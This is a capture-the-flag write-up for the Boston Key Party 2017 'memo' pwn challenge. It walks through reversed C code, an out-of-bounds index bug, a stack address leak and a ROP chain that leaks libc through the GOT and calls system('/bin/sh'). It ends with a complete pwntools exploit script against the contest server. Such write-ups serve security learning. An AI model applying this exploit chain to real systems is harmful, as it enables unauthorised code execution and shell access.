[writeup by @abiondo]

**CTF:** Boston Key Party CTF 2017

**Team:** No Pwn Intended

**Task:** pwn/memo

**Points:** 300

We were given an ELF 64-bit binary of a simple memo taking application, along with its dynamically linked `libc`. `checksec` shows NX and full RELRO. Here's the relevant reversed parts:

```c
// @ 0x602A00
size_t g_msg_index;
// @ 0x602A60
int g_msg_len[4];
char *g_msg_buf[5];
char **g_msg_stack[5];

// @ 0x400C04
int read_decimal(const char *prompt)
{
    char buf[8];

    printf(prompt);
    read(0, buf, sizeof(buf));

    return atoi(buf);
}

// @ 0x400C52
void new_message()
{
    char *buf; // @ bp - 16
    size_t len;

    buf = 0;
    len = 0;

    g_msg_index = read_decimal("Index: ");
    if (g_msg_buf[g_msg_index]) {
        puts("can't use this index\n");
        return;
    }

    if (g_msg_index > 4) {
        puts("Index too large");
        exit(1);
    }

    len = read_decimal("Length: ");
    if (len > 32) {
        puts("message too long, you can leave on memo though");
        buf = malloc(32);
        read(0, buf, len);
        puts("");
    } else {
        buf = malloc(len);
        printf("Message: ");
        read(0, buf, len);
        g_msg_buf[g_msg_index] = buf;
        g_msg_stack[g_msg_index] = &buf;
        g_msg_len[g_msg_index] = len;
        puts("");
    }
}

// @ 0x400DA8
void edit_message()
{
    if (!g_msg_buf[g_msg_index]) {
        puts("have to leave message first");
        exit(1);
    }

    printf("Edit message: ");
    read(0, g_msg_buf[g_msg_index], g_msg_len[g_msg_index]);

    puts("edited! this is edited message!");
    printf("%s\n\n", (char *) &g_msg_buf[g_msg_index]);
}
```

`new_message` and `edit_message` are called by `main` when `1` or `2` (respectively) are entered as choices in the main menu. There's an obvious heap overflow in `new_message` when `len > 32`, we're going to ignore that (there are more heap vulnerabilities in other places, I didn't use them). Instead, we see that `edit_message` trusts the value of `g_msg_index` (i.e. the index of the most recent memo we worked on). `new_message` sets it *before* checking it, so by trying to create a new memo with a bogus index and then editing it we can trigger out-of-bound reads for `g_msg_buf` and `g_msg_len`. Also note that `g_msg_len` is of the wrong size, `4` instead of `5`.

`g_msg_buf` immediately follows `g_msg_len` in memory, so (provided we pass the `!g_msg_buf[g_msg_index]` check) we can pass `read` an address as size, which will be a big number. Note that `read` reads *up to* the specified amount of bytes, so we can control how much we write. `g_msg_stack` follows `g_msg_buf` in memory, so we can make `read` write to a stack address in the now-defunct `new_message` stack frame. The base pointer for `new_message` and `edit_message` will be the same because they're both called from `main` and have the same arguments. Since the return address is at `bp + 8` and `buf` in `new_message` is at `bp - 16` we need `8 - (-16) = 24` filler bytes to reach the return address of `edit_message`. We now have RIP control.

Notice that `g_msg_len` is an array of `int`s, i.e. 4 bytes. The heap addresses in `g_msg_buf` are low and use the lower 32 bits, so we'll need the `g_msg_len` out-of-bounds to line up at a `g_msg_buf` element boundary (i.e. the edit index has to be even), otherwise we'll get a zero-length read. Also, the edit index has to be >= 5 to get to `g_msg_stack`. We'll create a memo with index `1`, then set the index to `6`, then edit sending our exploit buffer. This will result in `read(0, g_msg_stack[1], ((size_t) (g_msg_buf[1])) & 0xFFFFFFFF)`.

There's also an address leak in `edit_message`, which is useful as the stack is randomized. The function prints the *address* of the memo buffer as a string instead of its content. In our out-of-bounds situation this will be the address of `buf` in the `new_message` frame, i.e. the address at which `read` writes our data. `printf` will stop at the first NUL byte. We know the top two bytes will be zero (because 64-bit addressing is really 48-bit). We assume the lower 6 bytes don't contain NULs, so we can leak them (and if they do, we just need to try again).

The binary has NX mitigation, so we need to build a ROP chain. Unfortunately `libc` is dynamically linked, so we can only call imported functions via PLT, and there's no `system` or `exec*` imported. Also, the binary has a small selection of gadgets and there are no syscall gadgets. We have the `libc`, so we can figure out the offset of e.g. `system` from any other function. The plan is to read the address of a `libc` function (I chose `read`) off the GOT, calculate the address of `system` and call `system("/bin/sh")`. Note also that, due to full RELRO, we can't overwite the GOT, so we can't return to PLT and we'll need a gadget to jump to an arbitrary address stored in a register or memory.

Due to the small gadget selection I couldn't find a way to calculate the address of `system` inside the ROP chain, so the plan became sending the address of `read` over the socket to my script, doing the calculation there and sending the address of `system` back to the ROP chain. We need gadgets to set the first three arguments (`rdi`, `rsi`, `rdx`) and to jump to an arbitrary location read off memory. I used the following gadgets:

```
# pop rdi; ret;
POP_RDI = 0x401263
# pop rsi; pop r15; ret;
POP_RSI_R15 = 0x401261
# pop rbp; ret;
POP_RBP = 0x400900
# pop rdx; mov eax, dword ptr [rbp - 4];
# mov rax, qword ptr [rax*8 + 0x401528]; jmp rax;
POP_RDX_JMP = 0x401192 
```


The first three are self-explanatory (we'll see why we need `POP_RBP` shortly). The last one is a bit more complex and serves two purposes. First, it pops `rdx` off the stack, allowing us to set it. Then it does a jump through some indirections. It loads the dword `eax` from `rbp - 4`, then jumps to the address read from  `((uint64_t) eax) * 8 + 0x401528`. This allows us to jump to any address if we can place it somewhere in memory between `0x401528` and `0x800401520` at a 8-byte aligned offset from `0x401528`. Say our jump address is stored at `addr`: to prepare the jump we place the dword `(addr - 0x401528) / 8` at a known location `eax_addr`, then we use `POP_RBP` to set `rbp` to `eax_addr + 4`.

In the following listings each line is a 64-bit qword. The exploit buffer starts with 24 junk bytes to get to the return address. We then call `puts` to print the GOT entry for `read` (using `write` would've been better, but I was lazy and assumed there were no NULs in the bottom 48 bits):

```
POP_RDI
0x601fa8 # 1st arg, read() @ GOT
0x400818 # puts() @ PLT
```

Now we need to call `read(0, some_writable_address, 8)` to read back the address of `system`. I chose `0x602a00` (in BSS) as the writable address. We'll call `read` via the `POP_RDX_JMP` gadget (because we need to fill `rdx`). The address of `read` is placed at `0x601fa8` (in the GOT). We'll put `(0x601fa8 - 0x401528) / 8` on the stack, after the ROP chain. We leaked stack addresses so we know where it's at, and we'll call its address `eax_for_read_addr`. I also placed a trivial call to `getchar` to avoid partial read issues with the connection (and because I'm paranoid).

```
0x400858 # getchar() @ PLT
POP_RDI
0 # 1st arg
POP_RSI_R15
0x602a00 # 2nd arg, writable address
0 # r15, junk
POP_RBP
eax_for_read_addr + 4
POP_RDX_JMP
8 # 3rd arg
```

Great, now all we need to do is call `system("/bin/sh")`. The address of `system` is stored at `0x602a00`. We calculate `(0x602a00 - 0x401528) / 8` and put it on the stack at `eax_for_system_addr`. We also put a NUL-terminated string `/bin/sh` on the stack at `binsh_addr`.

```
POP_RDI
binsh_addr # 1st arg
POP_RBP
eax_for_system_addr + 4
POP_RDX_JMP
0 # rdx, junk
```

We finally get a shell:

```
$ cat /home/memo/flag
bkp{you are a talented and ambitious hacker}
```

Full exploit code:

```python
#!/usr/bin/python2

from pwn import *

def login(p, uname):
    p.recvuntil('name: ')
    p.sendline(uname)
    p.recvuntil('password? (y/n) ')
    p.sendline('n')

def do_cmd(p, cmd):
    p.recvuntil('>> ')
    p.sendline(cmd)

def new_memo_set_index(p, idx):
    do_cmd(p, '1')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

def new_memo(p, idx, size, msg):
    new_memo_set_index(p, idx)
    p.recvuntil('Length: ')
    p.sendline(str(size))
    p.recvuntil('Message: ')
    p.sendline(msg)

def edit_memo(p, msg):
    do_cmd(p, '2')
    p.recvuntil('Edit message: ')
    p.sendline(msg)
    p.recvuntil('message!\n')
    leak = p.recv(6)
    p.recvuntil('\n\n')
    return u64(leak + '\x00\x00')

PUTS_PLT = 0x400818
READ_PLT = 0x400840
GETCHAR_PLT = 0x400858
READ_GOT = 0x601fa8
POP_RDI = 0x401263
POP_RSI_R15 = 0x401261
POP_RBP = 0x400900
# pop rdx; mov eax, dword ptr [rbp - 4];
# mov rax, qword ptr [rax*8 + 0x401528]; jmp rax;
POP_RDX_JMP = 0x401192
W_ADDR = 0x602a00

SYSTEM_READ_OFF = -0xb1620 # -0xb23c0 local

IDX_NEW = 1
IDX_EDIT = 6

context(arch='amd64', os='linux')

p = remote('54.202.7.144', 8888)

login(p, 'A')

new_memo(p, IDX_NEW, 1, 'A')
new_memo_set_index(p, IDX_EDIT)

buf_addr = edit_memo(p, '')
eax_for_read_addr = buf_addr + 24 + 19*8
eax_for_system_addr = eax_for_read_addr + 4
binsh_addr = eax_for_system_addr + 4

buf  = 'A'*24

# puts(READ_GOT)
buf += p64(POP_RDI)
buf += p64(READ_GOT)
buf += p64(PUTS_PLT)
# getchar()
buf += p64(GETCHAR_PLT)
# read(0, W_ADDR, 8)
buf += p64(POP_RDI)
buf += p64(0)
buf += p64(POP_RSI_R15)
buf += p64(W_ADDR)
buf += p64(0) # r15, junk
buf += p64(POP_RBP)
buf += p64(eax_for_read_addr + 4)
buf += p64(POP_RDX_JMP)
buf += p64(8)
# (*W_ADDR)("/bin/sh")
buf += p64(POP_RDI)
buf += p64(binsh_addr)
buf += p64(POP_RBP)
buf += p64(eax_for_system_addr + 4)
buf += p64(POP_RDX_JMP)
buf += p64(0) # rdx, junk

buf += p32((READ_GOT - 0x401528) / 8)
buf += p32((W_ADDR - 0x401528) / 8)
buf += '/bin/sh\x00'

edit_memo(p, buf)
read_addr = u64(p.recv(6) + '\x00\x00')
p.sendline('A' + p64(read_addr + SYSTEM_READ_OFF))

p.interactive()
```
